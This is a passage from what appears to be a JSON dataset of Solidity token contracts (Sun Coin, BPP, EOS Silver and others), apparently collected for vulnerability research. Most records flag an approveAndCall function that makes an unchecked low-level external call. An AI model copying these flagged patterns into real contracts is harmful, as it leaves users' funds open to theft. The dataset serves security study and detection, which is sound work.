fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166c"
  },
  "filename": "661.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SUN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SUN(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Sun Coin\";\n decimals = 18;\n symbol = \"SUN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166d"
  },
  "filename": "686.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract BPPToken is StandardToken {\n function () public {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n constructor() public {\n name = 'Bpp';\n decimals = 18;\n symbol = 'BPP';\n totalSupply = 21000000000 * 10 ** uint256(decimals);\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166e"
  },
  "filename": "687.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"LifeIsaGame\";\n decimals = 8;\n symbol = \"LAG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166f"
  },
  "filename": "691.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EOS_Silver is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function EOS_Silver() {\n balances[msg.sender] = 10000000000000000000000000000;\n totalSupply = 10000000000000000000000000000;\n name = \"EOS Silver\";\n decimals = 18;\n symbol = \"EOS.S\";\n unitsOneEthCanBuy = 4000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1670"
  },
  "filename": "707.sol",
  "content": "pragma solidity >=0.4.18;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint _capacity) internal pure {\n uint capacity = _capacity;\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(ptr, 0)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Android = 0x40;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, 